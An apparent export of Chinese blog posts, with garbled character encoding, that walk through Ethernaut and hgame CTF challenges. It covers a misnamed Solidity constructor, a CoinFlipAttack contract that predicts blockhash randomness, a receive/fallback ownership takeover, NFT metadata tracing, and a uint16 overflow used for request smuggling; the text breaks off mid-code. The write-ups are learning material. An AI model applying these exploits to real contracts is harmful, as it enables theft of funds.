[{"title":"Ethernaut-åˆ·é¢˜å°è®°ï¼ˆäºŒï¼‰","url":"/2025/03/18/Ethernaut-åˆ·é¢˜å°è®°ï¼ˆäºŒï¼‰/","content":"\n# Ethernautåˆ·é¢˜å°è®°ï¼ˆäºŒï¼‰\n\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.6.0;\n\nimport \"@openzeppelin/contracts/math/SafeMath.sol\";\n\ncontract Fallout {\n    using SafeMath for uint256;\n\n    mapping(address => uint256) allocations;\n    address payable public owner;\n\n    /* constructor */\n    function Fal1out() public payable {\n        owner = msg.sender;\n        allocations[owner] = msg.value;\n    }\n\n    modifier onlyOwner() {\n        require(msg.sender == owner, \"caller is not the owner\");\n        _;\n    }\n\n    function allocate() public payable {\n        allocations[msg.sender] = allocations[msg.sender].add(msg.value);\n    }\n\n    function sendAllocation(address payable allocator) public {\n        require(allocations[allocator] > 0);\n        allocator.transfer(allocations[allocator]);\n    }\n\n    function collectAllocations() public onlyOwner {\n        msg.sender.transfer(address(this).balance);\n    }\n\n    function allocatorBalance(address allocator) public view returns (uint256) {\n        return allocations[allocator];\n    }\n}\n```\n\nç¬¬äºŒå…³æ²¡å•¥ä¸œè¥¿ï¼Œå°±æ˜¯å› ä¸ºåˆçº¦åå­—æ˜¯`Fallout`ï¼Œè€Œæ„é€ å‡½æ•°å«åš`Fal1out`ï¼Œå› ä¸ºè¿™ä¸ªé”™è¯¯ï¼Œå½“åˆçº¦è¢«éƒ¨ç½²æ—¶ï¼Œæ„é€ å‡½æ•°åœ¨åˆ›å»ºæ—¶ä»æœªè¢«æ‰§è¡Œï¼Œownerè‡ªç„¶ä¹Ÿæ²¡æœ‰æ›´æ–°ï¼Œå› ä¸º`Fal1out`è¢«å½“ä½œä¸€ä¸ªæ™®é€šå‡½æ•°äº†ï¼Œä»è€Œæˆ‘ä»¬å¯ä»¥å¤šæ¬¡è°ƒç”¨ï¼Œå¹¶ä¸”è°ƒç”¨ä¸€æ¬¡ï¼Œåˆçº¦æ‰€æœ‰è€…å°±æ˜¯æˆ‘ä»¬è‡ªå·±äº†ã€‚\n\n> *åœ¨ Solidity 0.4.22 ä¹‹å‰ï¼Œä¸ºä¸€ä¸ªåˆçº¦å®šä¹‰æ„é€ å‡½æ•°çš„å”¯ä¸€æ–¹æ³•æ˜¯å®šä¹‰ä¸€ä¸ªä¸åˆçº¦æœ¬èº«åŒåçš„å‡½æ•°ã€‚*    \n>\n> åœ¨è¯¥ç‰ˆæœ¬ä¹‹åï¼Œä»–ä»¬å¼•å…¥äº†ä¸€ä¸ªæ–°çš„`constructor`å…³é”®å­—æ¥é¿å…è¿™ç§é”™è¯¯ã€‚*    \n>\n> *åœ¨è¿™ä¸ªä¾‹å­ä¸­ï¼Œå¼€å‘è€…çŠ¯äº†ä¸€ä¸ªé”™è¯¯ï¼ŒæŠŠæ„é€ å‡½æ•°çš„åå­—å¼„é”™äº†ã€‚*    \n>\n> *Contract name -> Fallout*    *// Constructor name -> Fal1out*    *// è¿™æ ·åšçš„ç»“æœæ˜¯ï¼Œåˆçº¦ä»æœªè¢«åˆå§‹åŒ–ï¼Œæ‰€æœ‰è€…æ˜¯åœ°å€(0)*    \n>\n> *è€Œä¸”æˆ‘ä»¬èƒ½å¤Ÿè°ƒç”¨`Fal1out`å‡½æ•°ï¼Œåœ¨è¿™ä¸€ç‚¹ä¸Šï¼Œå®ƒä¸æ˜¯ä¸€ä¸ªæ„é€ å‡½æ•°ï¼ˆåªèƒ½è°ƒç”¨ä¸€æ¬¡ï¼‰ï¼Œè€Œæ˜¯ä¸€ä¸ª \"æ™®é€š\"å‡½æ•°ã€‚*    \n>\n> *è¿™ä¹Ÿæ„å‘³ç€ä»»ä½•äººéƒ½å¯ä»¥å¤šæ¬¡è°ƒç”¨è¿™ä¸ªå‡½æ•°æ¥åˆ‡æ¢åˆçº¦çš„æ‰€æœ‰è€…ã€‚*\n\né€šå…³æ¡ä»¶å°±æ˜¯æ‹¿åˆ°owner\n\næ¥ç€å¼€å§‹ç¬¬ä¸‰å…³\n\n```json\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\ncontract CoinFlip {\n    uint256 public consecutiveWins;\n    uint256 lastHash;\n    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;\n\n    constructor() {\n        consecutiveWins = 0;\n    }\n\n    function flip(bool _guess) public returns (bool) {\n        uint256 blockValue = uint256(blockhash(block.number - 1));\n\n        if (lastHash == blockValue) {\n            revert();\n        }\n\n        lastHash = blockValue;\n        uint256 coinFlip = blockValue / FACTOR;\n        bool side = coinFlip == 1 ? true : false;\n\n        if (side == _guess) {\n            consecutiveWins++;\n            return true;\n        } else {\n            consecutiveWins = 0;\n            return false;\n        }\n    }\n}\n```\n\nåˆ†æåˆçº¦\n\næˆ‘ä»¬éœ€è¦è¿ç»­çŒœå¯¹åæ¬¡ç¡¬å¸çš„æ­£åé¢æ‰èƒ½é€šå…³\n\né€šè¿‡åˆ†æåˆçº¦å¯ä»¥ç¡®å®š`_guess=uint256(blockhash(block.number.sub(1))).div(57896044618658097711785492504343953926634992332820282019728792003956564819968)`ï¼Œé‚£æˆ‘ä»¬ä¸å°±å·²ç»çŸ¥é“æ€ä¹ˆå»é¢„æµ‹äº†å—ï¼Œå–å½“å‰åŒºå—çš„ **å‰ä¸€ä¸ªåŒºå—**ï¼ˆ`block.number - 1`ï¼‰çš„ **å“ˆå¸Œå€¼**ï¼Œå¹¶å°†å…¶è½¬æ¢æˆ `uint256` ç±»å‹ã€‚ä½¿ç”¨ `blockhash(block.number - 1)` ç”Ÿæˆ**éšæœºæ€§**\n\nç›´æ¥ä¸Šæ”»å‡»ä»£ç ï¼ˆä»£ç æ¥è‡ª9CÂ±Voidå¸ˆå‚…ï¼‰\n\n```json\n/// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\nimport './Level3.sol';\n\ncontract CoinFlipAttack{\n    address target_addr;\n    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;\n    uint256 lastHash;\n\n    constructor(){\n        target_addr = æ”»å‡»åˆçº¦åœ°å€;\n    }\n    function attack() public{\n        uint256 blockValue = uint256(blockhash(block.number-1));\n\n        lastHash = blockValue;\n        uint256 coinFlipResult = blockValue / FACTOR;\n        bool side = coinFlipResult == 1 ? true : false;\n\n        CoinFlip(target_addr).flip(side);\n    }\n}\n```\n\n> 1. åŒºå—é“¾ä¸Šçš„æ‰€æœ‰ä¸œè¥¿éƒ½æ˜¯å…¬å¼€çš„ï¼Œå³ä¾¿æ˜¯åƒ \"lastHash \"å’Œ \"FACTOR \"è¿™æ ·çš„ç§æœ‰å˜é‡ï¼›\n> 2. åŒºå—é“¾ä¸­æ²¡æœ‰çœŸæ­£çš„ \"åŸç”Ÿ\" éšæœºæ€§ï¼Œè€Œåªæœ‰ \"ä¼ªéšæœºæ€§\"ã€‚\n\n~~ä¸€å¼€å§‹æˆ‘æ˜¯å†™äº†ä¸€ä¸ªå¾ªç¯çš„ï¼Œä½†æ˜¯å‘ç°éœ€è¦åœå‡ ç§’,å› ä¸ºè¦ç­‰`lastHash = blockValue`ï¼Œä½†æ˜¯åˆçº¦ä»£ç æ˜¯æ²¡æœ‰æš‚åœè¿™ä¸ªåŠŸèƒ½çš„,åªèƒ½ä½œç½¢~~","tags":["blockchain solidity"]},{"title":"Ethernaut_åˆ·é¢˜å°è®°ï¼ˆä¸€ï¼‰","url":"/2025/03/12/Ethernaut-åˆ·é¢˜å°è®°ï¼ˆä¸€ï¼‰/","content":"\n# Ethernaut_åˆ·é¢˜å°è®°ï¼ˆä¸€ï¼‰\n\næœ¬äººæ‰€æœ‰é¢˜ç›®æ˜¯æŠŠå®ƒæ‹‰åˆ°Remix VMé‡Œé¢åšçš„ï¼Œæ•ˆæœéƒ½æ˜¯ä¸€æ ·ã€‚\n\næ‹¿åˆ°åˆçº¦ä»£ç ï¼Œç›®æ ‡æ˜¯è¦æ±‚è·å¾—`Fallback`åˆçº¦çš„æ‰€æœ‰æƒï¼Œå¹¶å°†å…¶ä½™é¢å‡å°‘åˆ°0ã€‚\n\n```json\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\ncontract Fallback {\n    mapping(address => uint256) public contributions;\n    address public owner;\n\n    constructor() {\n        owner = msg.sender;\n        contributions[msg.sender] = 1000 * (1 ether);\n    }\n\n    modifier onlyOwner() {\n        require(msg.sender == owner, \"caller is not the owner\");\n        _;\n    }\n\n    function contribute() public payable {\n        require(msg.value < 0.001 ether);\n        contributions[msg.sender] += msg.value;\n        if (contributions[msg.sender] > contributions[owner]) {\n            owner = msg.sender;\n        }\n    }\n\n    function getContribution() public view returns (uint256) {\n        return contributions[msg.sender];\n    }\n\n    function withdraw() public onlyOwner {\n        payable(owner).transfer(address(this).balance);\n    }\n\n    receive() external payable {\n        require(msg.value > 0 && contributions[msg.sender] > 0);\n        owner = msg.sender;\n    }\n}\n```\n\nå®¡è®¡è¿™ä¸ªä»£ç ï¼Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°æœ‰ä¸¤ä¸ªå‡½æ•°æ¶‰åŠåˆ°äº†ownerçš„åˆ†é…\n\n```json\nfunction contribute() public payable {\n        require(msg.value < 0.001 ether);\n        contributions[msg.sender] += msg.value;\n        if (contributions[msg.sender] > contributions[owner]) {\n            owner = msg.sender;\n        }\n    }\n```\n\n```json\nreceive() external payable {\n        require(msg.value > 0 && contributions[msg.sender] > 0);\n        owner = msg.sender;\n    }\n```\n\nç¬¬ä¸€ä¸ªæˆä¸ºownerçš„æ¡ä»¶æ˜¯è¦æåˆ°1000ethï¼ˆ`contributions[msg.sender] = 1000 * (1 ether);`ï¼‰ã€‚ã€‚ã€‚ã€‚æ˜¾ç„¶æœ‰ç‚¹ã€‚ã€‚ã€‚ååˆ†ä¸å¯èƒ½ï¼ï¼\n\nè€Œç¬¬äºŒä¸ªï¼Œå°±æ˜¯åªè¦å­˜æ¬¾å¤§äº0å°±èƒ½æˆä¸ºownerï¼Œé‚£æˆ‘ä»¬å›ºç„¶é€‰æ‹©åè€…\n\né€‰æ‹©åè€…å°±æ˜¯çœ‹æ€ä¹ˆæ ·è°ƒç”¨å®ƒäº†\n\nSolidityæ–‡æ¡£ä¸­å¯¹receiveçš„æè¿°\n\n> ä¸€ä¸ªåˆçº¦æœ€å¤šå¯ä»¥æœ‰ä¸€ä¸ª `receive` å‡½æ•°ï¼Œå£°æ˜ä¸º `receive() external payable { ... }` ï¼ˆä¸å¸¦ `function` å…³é”®å­—ï¼‰ã€‚ è¯¥å‡½æ•°ä¸èƒ½æœ‰å‚æ•°ï¼Œä¸èƒ½è¿”å›ä»»ä½•å†…å®¹ï¼Œå¿…é¡»å…·æœ‰ `external` å¯è§æ€§å’Œ `payable` çŠ¶æ€å¯å˜æ€§ã€‚ å®ƒå¯ä»¥æ˜¯è™šæ‹Ÿçš„ï¼Œå¯ä»¥é‡å†™ï¼Œå¹¶ä¸”å¯ä»¥æœ‰ ä¿®æ”¹å™¨modifierã€‚\n>\n> æ¥æ”¶å‡½æ•°åœ¨è°ƒç”¨åˆçº¦æ—¶æ‰§è¡Œï¼Œä¸”æ²¡æœ‰æä¾›ä»»ä½• calldataã€‚\n\nå¯¹fallbackå‡½æ•°çš„æè¿°\n\n> ä¸€ä¸ªåˆçº¦æœ€å¤šå¯ä»¥æœ‰ä¸€ä¸ª `fallback` å‡½æ•°ï¼Œå£°æ˜ä¸º `fallback () external [payable]` æˆ– `fallback (bytes calldata input) external [payable] returns (bytes memory output)` ï¼ˆä¸¤è€…å‡ä¸å¸¦ `function` å…³é”®å­—ï¼‰ã€‚\n>\n> è¯¥å‡½æ•°å¿…é¡»å…·æœ‰ `external` å¯è§æ€§ã€‚å›é€€å‡½æ•°å¯ä»¥æ˜¯è™šæ‹Ÿçš„ï¼Œå¯ä»¥é‡å†™ï¼Œå¹¶ä¸”å¯ä»¥æœ‰ä¿®æ”¹å™¨ã€‚\n>\n> å¦‚æœæ²¡æœ‰å…¶ä»–å‡½æ•°ä¸ç»™å®šçš„å‡½æ•°ç­¾ååŒ¹é…ï¼Œæˆ–è€…æ ¹æœ¬æ²¡æœ‰æä¾›æ•°æ®ä¸”æ²¡æœ‰ [æ¥æ”¶ä»¥å¤ªå‡½æ•°](https://learnblockchain.cn/docs/solidity/contracts.html#receive-ether-function)ï¼Œã€åˆ™åœ¨è°ƒç”¨åˆçº¦æ—¶æ‰§è¡Œå›é€€å‡½æ•°ã€‚ å›é€€å‡½æ•°å§‹ç»ˆæ¥æ”¶æ•°æ®ï¼Œä½†ä¸ºäº†æ¥æ”¶ä»¥å¤ªå¸ï¼Œå®ƒå¿…é¡»æ ‡è®°ä¸º `payable`ã€‚\n\nè€Œå‡½æ•°withdraw()æ˜¯å¯ä»¥æ¸…ç©ºä½™é¢çš„\n\n```json\nfunction withdraw() public onlyOwner {\n        payable(owner).transfer(address(this).balance);\n    }\n```\n\né‚£æˆ‘ä»¬çš„æ€è·¯å°±å¾ˆæ˜äº†äº†ï¼Œå…ˆç”¨`contribute`ï¼Œç»™ç‚¹å½“å‰ç”¨æˆ·ä½™é¢ï¼Œç„¶åæˆ‘ä»¬è®¾ç½®ä¸€ä¸ªä¸ä¸º0çš„valueçš„å€¼ï¼Œå†å°†calldataç½®ä¸ºç©ºå‘é€äº¤æ˜“å°±å¯ä»¥è®©ownerå˜æˆæˆ‘ä»¬äº†~ï¼Œå†è°ƒç”¨withdrawå‡½æ•°æ¸…ç©ºï¼Œè¿™å…³å°±æŒ‘æˆ˜å®Œæˆäº†\n\n\n\né‚£ä½ å¯èƒ½ä¼šæœ‰ä¸€ä¸ªç–‘æƒ‘ï¼Œä¸ºä»€ä¹ˆæ²¡æœ‰ç”¨åˆ°fallbackå‡½æ•°ï¼Œä½†æ˜¯æœ‰ç‚¹æ–‡ç« å´è¯´fallbackæ˜¯è€ƒç‚¹å‘¢ï¼Ÿå…¶å®æœ€åˆç‰ˆæœ¬æ˜¯ç”¨åˆ°çš„ä¸‹é¢çš„è¿™ä¸ªæºç \n\n```\npragma solidity ^0.6.0;\n\nimport '@openzeppelin/contracts/math/SafeMath.sol';\n\ncontract Fallback {\n\n  using SafeMath for uint256;\n  mapping(address => uint) public contributions;\n  address payable public owner;\n\n  constructor() public {\n    owner = msg.sender;\n    contributions[msg.sender] = 1000 * (1 ether);\n  }\n\n  modifier onlyOwner {\n        require(\n            msg.sender == owner,\n            \"caller is not the owner\"\n        );\n        _;\n    }\n\n  function contribute() public payable {\n    require(msg.value < 0.001 ether);\n    contributions[msg.sender] += msg.value;\n    if(contributions[msg.sender] > contributions[owner]) {\n      owner = msg.sender;\n    }\n  }\n\n  function getContribution() public view returns (uint) {\n    return contributions[msg.sender];\n  }\n\n  function withdraw() public onlyOwner {\n    owner.transfer(address(this).balance);\n  }\n\n  fallback() external payable {\n    require(msg.value > 0 && contributions[msg.sender] > 0);\n    owner = msg.sender;\n  }\n}\n```\n\nå°±æ˜¯åˆ©ç”¨çš„fallbackå‡½æ•°å“¦~ï¼Œåœ¨calldataä¸ºç©ºçš„æƒ…å†µä¸‹ï¼Œfallbackå’Œreceiveæ˜¯ç­‰ä»·çš„ï¼\n","tags":["blockchain"]},{"title":"Level_729_æ˜“ç”»è¡Œ-å¤ç°","url":"/2025/02/21/Level-729-æ˜“ç”»è¡Œ-å¤ç°/","content":"\n# hgame æ˜“ç”»è¡Œå¤ç°\n\n> æ­¤é¢˜æ˜¯ä¸ºäº†è®©â¼¤å®¶ç¨å¾®äº†è§£â¼€ä¸‹åŒºå—é“¾ã€‚éœ€è¦çš„çŸ¥è¯†æ˜¯åŒºå—é“¾çš„â¼€äº›åŸºæœ¬çŸ¥è¯†å’Œipfsçš„â¼€äº›çŸ¥è¯†ã€‚\n\nè¿™é“é¢˜ç¡®å®ä¸éš¾ï¼Œå¯æƒœæˆ‘æ²¡æœ‰è®¤çœŸå­¦Blockchainï¼Œåšè¿™ä¸ªé¢˜ä¹Ÿæ²¡æœ‰æŠ•å…¥ç²¾åŠ›ï¼Œåªæ˜¯çœ‹äº†çœ‹ï¼Œèµ›å9CÂ±Voidå¸ˆå‚…ç»™æˆ‘å†™äº†ä¸€ä»½è§£æï¼Œåœ¨æ­¤è‡´è°¢ï¼\n\né¢˜ç›®ç»™äº†ä¸€ä¸ªTypescriptæ–‡ä»¶\n\n```ts\nimport { ethers } from 'ethers';\nimport config from './config.json';\n\nconst abi = [\n  'function safeTransferFrom(address from, address to, uint256 tokenId) external',\n  'function approve(address to, uint256 tokenId) external',\n  'function getApproved(uint256 tokenId) external view returns (address)',\n  'function ownerOf(uint256 tokenId) external view returns (address)',\n];\n\nasync function transferNFT(tokenId: number, toAddress: string) {\n  const provider = new ethers.JsonRpcProvider('https://sepolia.drpc.org');\n  const wallet = new ethers.Wallet(config.privateKey, provider);\n\n  if (wallet.address.toLowerCase() !== config.fromAddress.toLowerCase()) {\n    throw new Error('ç§é’¥ä¸å‘é€æ–¹åœ°å€ä¸åŒ¹é…');\n  }\n\n  const nftContract = new ethers.Contract(config.nftAddress, abi, wallet);\n\n  try {\n    console.log('å¼€å§‹è½¬ç§»NFT...');\n    const tx = await nftContract.safeTransferFrom(\n      config.fromAddress,\n      toAddress,\n      tokenId\n    );\n\n    console.log('ç­‰å¾…äº¤æ˜“ç¡®è®¤...');\n    const receipt = await tx.wait();\n    console.log(`NFTè½¬ç§»æˆåŠŸ! äº¤æ˜“å“ˆå¸Œ: ${receipt.hash}`);\n\n    return receipt;\n  } catch (error) {\n    console.error('è½¬ç§»NFTæ—¶å‘ç”Ÿé”™è¯¯:', error);\n    throw error;\n  }\n}\n\nconst tokenId = 1;\nconst toAddress = '0x74520Ad628600F7Cc9613345aee7afC0E06EFd84';\n\ntransferNFT(tokenId, toAddress)\n  .then(() => console.log('è½¬ç§»å®Œæˆ'))\n  .catch(console.error);\n\n```\n\nä»£ç ä½¿ç”¨ `ethers.js` è¿›è¡Œæ™ºèƒ½åˆçº¦äº¤äº’ï¼Œä»£ç ä¸­ä½¿ç”¨äº†`ethers.JsonRpcProvider('https://sepolia.drpc.org')`ï¼Œæ„å‘³ç€è¿™ä¸ªè„šæœ¬æ˜¯è¿æ¥**Sepolia æµ‹è¯•ç½‘**ï¼Œå¹¶æœ‰NFTè½¬ç§»çš„æ“ä½œï¼Œæœ€åå‘Šè¯‰äº†æˆ‘ä»¬è½¬ç§»çš„NFTçš„TokenIDå’ŒNFTæ¥æ”¶æ–¹çš„åœ°å€ï¼Œå› æ­¤æˆ‘ä»¬è‚¯å®šæ˜¯è¦ä»æ¥æ”¶æ–¹åœ°å€å¼€å§‹ä¸‹æ‰‹ã€‚\n\nç”¨Etherscanæµè§ˆå™¨æœç´¢ï¼Œä¸è¿‡æ˜¯æµ‹è¯•ç½‘ï¼Œæ‰€ä»¥ç”¨è¿™ä¸ªhttps://sepolia.etherscan.io/\n\n![image-20250221205422018](https://kingofyou.oss-cn-beijing.aliyuncs.com/D:%5CBolg%5Chexo-blog%5Csource%5C_posts%5C%E6%B5%8B%E8%AF%95%E6%96%87%E7%AB%A0202502212054413.png)\n\nçœ‹åˆ°é‚£ä¸ªVidarçš„NFTï¼Œè·å–NFTçš„ tokenURI æœ‰2ç§åšæ³•\n\n## ä¸¤ç§è§£æ³•\n\n### ç¬¬ä¸€ç§ï¼šçº¯ç²¹çš„æº¯æº\n\n##### ç‚¹å‡»å³ä¸‹é‚£ä¸ª NFT: Vidar#1 æˆ‘ä»¬èƒ½è¿›å…¥\n\n> ä¸‹é¢ä¸€å…±å°±åªæœ‰é“¸\n>\n> é€ ï¼ˆMintï¼‰å’Œè½¬ç§»ï¼ˆTransferï¼‰ä¸¤ä¸ªæ“ä½œï¼Œè€Œä¸€èˆ¬æ¥è¯´å¯¹äºä¸€ä¸ªNFTè€Œè¨€ï¼Œå®ƒçš„Metadataåªä¼šåœ¨é“¸é€ çš„\n>\n> æ—¶å€™è¿›è¡Œè®¾å®šï¼Œä¹‹åå®ƒçš„Metadataå°†ä¸å†å‘ç”Ÿæ”¹å˜ï¼Œå› æ­¤æˆ‘ä»¬éœ€è¦æŸ¥çœ‹å®ƒçš„é“¸é€ æ“ä½œ\n\n![image-20250221205858451](https://kingofyou.oss-cn-beijing.aliyuncs.com/D:%5CBolg%5Chexo-blog%5Csource%5C_posts%5C%E6%B5%8B%E8%AF%95%E6%96%87%E7%AB%A0202502212058519.png)\n\næˆ‘ä»¬ç‚¹å‡»æœ€ä¸‹é¢é‚£ä¸ª\n\n##### è¿›å…¥å¯¹åº”çš„äº¤æ˜“è¯¦æƒ…é¡µé¢ï¼Œåœ¨Logsé‡Œé¢çœ‹åˆ°åˆçº¦emitäº†MetadataUpdateäº‹ä»¶ï¼Œè¯´æ˜è¿™ä¸ªäº¤æ˜“ä¸­çš„ç¡®å‘ç”Ÿäº†Metadataçš„æ”¹å˜\n\n![image-20250221210227181](https://kingofyou.oss-cn-beijing.aliyuncs.com/D:%5CBolg%5Chexo-blog%5Csource%5C_posts%5C%E6%B5%8B%E8%AF%95%E6%96%87%E7%AB%A0202502212104661.png)\n\n![image-20250221210359382](https://kingofyou.oss-cn-beijing.aliyuncs.com/D:%5CBolg%5Chexo-blog%5Csource%5C_posts%5C%E6%B5%8B%E8%AF%95%E6%96%87%E7%AB%A0202502212104679.png)\n\n##### æ”¹å˜çš„æ•°æ®æˆ‘ä»¬å¯ä»¥ç›´æ¥æŸ¥çœ‹äº¤æ˜“ä¸­çš„ Input Data æ ï¼Œç‚¹å‡» Decode Input Data æˆ‘ä»¬å°±èƒ½å¤Ÿçœ‹åˆ°ä¿®æ”¹çš„tokenURIæ˜¯ä»€ä¹ˆäº†\n\n![image-20250221210625006](https://kingofyou.oss-cn-beijing.aliyuncs.com/D:%5CBolg%5Chexo-blog%5Csource%5C_posts%5C%E6%B5%8B%E8%AF%95%E6%96%87%E7%AB%A0202502212239885.png)\n\n![image-20250221210727735](https://kingofyou.oss-cn-beijing.aliyuncs.com/D:%5CBolg%5Chexo-blog%5Csource%5C_posts%5C%E6%B5%8B%E8%AF%95%E6%96%87%E7%AB%A0202502212107842.png)\n\n##### ç”¨ipfs desktopæ‰“å¼€ipfsåœ°å€\n\n![image-20250221220537786](https://kingofyou.oss-cn-beijing.aliyuncs.com/D:%5CBolg%5Chexo-blog%5Csource%5C_posts%5C%E6%B5%8B%E8%AF%95%E6%96%87%E7%AB%A0202502212205514.png)\n\nä¸ä¸‹è½½è¿™ä¸ªä¹Ÿå¯ï¼Œè®¿é—®è¿™ä¸ªhttps://ipfs.io/ipfs/(Link Hash)\n\n### ç¬¬äºŒç§ï¼šåˆçº¦è°ƒç”¨\n\nè¿™ä¸ªæ˜¯9CÂ±Voidå¸ˆå‚…å†™çš„è„šæœ¬~~ï¼Œæœ¬äººå¤ªèœï¼Œå…¥é—¨ç¨‹åº¦éƒ½æœªåˆ°~~\n\n```python\nfrom web3 import Web3\n\n# Configuration\nRPC_URL = \"https://sepolia.drpc.org\"\nNFT_ADDRESS = \"0x0c5ABBB0743a3Ac77C2c301eD63810F3353c59F8\"\n\n# åˆå§‹åŒ– Web3 è¿æ¥\nw3 = Web3(Web3.HTTPProvider(RPC_URL))\n\n# æ£€æŸ¥è¿æ¥æ˜¯å¦æˆåŠŸ\nif not w3.is_connected():\n    raise ConnectionError(\"æ— æ³•è¿æ¥åˆ°ä»¥å¤ªåŠèŠ‚ç‚¹ï¼Œè¯·æ£€æŸ¥ RPC URL\")\n\n# åˆçº¦ ABI\nABI = [\n    {\n        \"inputs\": [\n            {\"internalType\": \"uint256\", \"name\": \"tokenId\", \"type\": \"uint256\"},\n        ],\n        \"name\": \"tokenURI\",\n        \"outputs\": [{\"internalType\": \"string\", \"name\": \"\", \"type\": \"string\"}],\n        \"stateMutability\": \"view\",  # ä¿®æ­£ä¸º view\n        \"type\": \"function\",\n    },\n]\n\n# ç»‘å®šåˆçº¦\nnft = w3.eth.contract(address=NFT_ADDRESS, abi=ABI)\n\n# è°ƒç”¨ tokenURI æ–¹æ³•\ntoken_id = 1\ntry:\n    uri = nft.functions.tokenURI(token_id).call()\n    print(f\"Token {token_id} URI: {uri}\")\nexcept Exception as e:\n    print(f\"è°ƒç”¨ tokenURI å¤±è´¥: {e}\")\n\n```\n\n![image-20250221221140796](https://kingofyou.oss-cn-beijing.aliyuncs.com/D:%5CBolg%5Chexo-blog%5Csource%5C_posts%5C%E6%B5%8B%E8%AF%95%E6%96%87%E7%AB%A0202502212211911.png)\n\næ¥ä¸‹æ¥å°±å’Œä¸Šé¢ä¸€æ ·äº†\n\n> æœ‰å…³ä¸Šé¢çš„MetadataUpdateäº‹ä»¶ï¼Œè¿™ä¸ªäº‹ä»¶æ¥è‡ªEIP5008: ERC-721 Nonce and Metadata\n>\n> Update Extension - EIPs - Fellowship of Ethereum Magiciansï¼Œç›´æ¥å»å®˜ç½‘ä¸Šçœ‹EIP-5008çš„è¯åª\n>\n> ä¼šçœ‹åˆ°å®ƒå¯¹Nonceæ‹“å±•çš„å®šä¹‰ï¼Œä½†æ˜¯å®˜ç½‘ç»™å‡ºäº†é€šå¾€ä¸Šé¢è¿™ä¸ªé“¾æ¥çš„è·³è½¬\n\nå‚è€ƒï¼š[ERC-721ï¼šéåŒè´¨åŒ–ä»£å¸æ ‡å‡†](https://eips.ethereum.org/EIPS/eip-721)","tags":["æ™ºèƒ½åˆçº¦"]},{"title":"ä¸å­˜åœ¨çš„è½¦å¢å¤ç°","url":"/2025/02/19/ä¸å­˜åœ¨çš„è½¦å¢å¤ç°/","content":"\n# 2025 hgame-ä¸å­˜åœ¨çš„è½¦å¢å¤ç°\n\nå®˜æ–¹WPæ€è·¯å¦‚ä¸‹ï¼š\n\n![image-20250219131123627](https://kingofyou.oss-cn-beijing.aliyuncs.com/D:%5CBolg%5Chexo-blog%5Csource%5C_posts%5C%E6%B5%8B%E8%AF%95%E6%96%87%E7%AB%A0202502191311489.png)\n\né¢˜ç›®ç»™äº†æºç ï¼Œåˆ†æä»£ç å¯å¾—\n\n![image-20250219131301665](https://kingofyou.oss-cn-beijing.aliyuncs.com/D:%5CBolg%5Chexo-blog%5Csource%5C_posts%5C%E6%B5%8B%E8%AF%95%E6%96%87%E7%AB%A0202502191313910.png)\n\nå¼€æ”¾çš„æ˜¯8081ç«¯å£\n\n![image-20250219131343825](https://kingofyou.oss-cn-beijing.aliyuncs.com/D:%5CBolg%5Chexo-blog%5Csource%5C_posts%5C%E6%B5%8B%E8%AF%95%E6%96%87%E7%AB%A0202502191313777.png)\n\nflagåœ¨8080ç«¯å£\n\nå½“æˆ‘ä»¬ç”¨GETæ–¹å¼è®¿é—®ï¼Œä¼šå¾—åˆ°Welcome to HGAME 2025å“åº”ï¼Œç”¨POSTçš„è¯ï¼Œä»£ç†ä¼šç›´æ¥æ‹’ç»ï¼Œåšé¢˜æ—¶ï¼Œæƒ³åˆ°äº†ç”¨èµ°ç§é€šè¿‡8081ç«¯å£èµ°ç§8080æ‹¿åˆ°flagï¼Œä½†æ˜¯çœ‹ä¸æ˜ç™½request.goï¼Œæ²¡æƒ³åˆ°æ•´æ•°æº¢å‡ºï¼Œè¿™é“é¢˜ç¡®å®å—ç›ŠåŒªæµ…\n\n#### åˆ†ærequest.go\n\n##### å†™å…¥å‡½æ•°åˆ†æ\n\nè¿™æ®µ Go ä»£ç å®ç°äº†ä¸€ä¸ªè‡ªå®šä¹‰çš„ **H111** è¯·æ±‚åè®®ï¼Œèƒ½å¤Ÿåºåˆ—åŒ–ï¼ˆå†™å…¥ï¼‰å’Œååºåˆ—åŒ–ï¼ˆè¯»å–ï¼‰`http.Request`ã€‚å®ƒåŒ…å«ä¸¤ä¸ªæ ¸å¿ƒå‡½æ•°ï¼š\n\n1. `ReadH111Request(reader io.Reader) (*http.Request, error)`\n   **ä»äºŒè¿›åˆ¶æµè¯»å–æ•°æ®ï¼Œå¹¶æ„é€  HTTP è¯·æ±‚**\n2. `WriteH111Request(writer io.Writer, req *http.Request) error`\n   **å°† HTTP è¯·æ±‚åºåˆ—åŒ–ä¸ºäºŒè¿›åˆ¶æ•°æ®æµ**\n\nåœ¨ `WriteH111Request()` é‡Œï¼Œæ•°æ®é•¿åº¦æ˜¯è¿™æ ·å†™å…¥çš„ï¼š\n\n```go\nbinary.Write(writer, binary.BigEndian, uint16(len(methodBytes)))\n```\n\nå¦‚æœ `methodBytes` é•¿åº¦ **æ„å¤–è¶…è¿‡ 65535**ï¼Œä¾‹å¦‚ï¼š\n\n```go\nmethodBytes := make([]byte, 65536) // é•¿åº¦ = 65536\nbinary.Write(writer, binary.BigEndian, uint16(len(methodBytes))) \n```\n\nä¸¾ä¸ªä¾‹å­ç»™ä½ ä»¬çœ‹\n\n```go\npackage main\n\nimport \"fmt\"\n\nfunc main() {\n\tvar num1 int = 65536\n\tvar num2 int = 65537\n\tvar num3 int = 65538\n\tvar num4 int = 131072\n\n\tfmt.Println(\"uint16(65536):\", uint16(num1))  // 65536 æº¢å‡ºï¼Œå˜æˆ 0\n\tfmt.Println(\"uint16(65537):\", uint16(num2))  // 65537 æº¢å‡ºï¼Œå˜æˆ 1\n\tfmt.Println(\"uint16(65538):\", uint16(num3))  // 65538 æº¢å‡ºï¼Œå˜æˆ 2\n\tfmt.Println(\"uint16(131072):\", uint16(num4)) // 131072 æº¢å‡ºï¼Œå˜æˆ 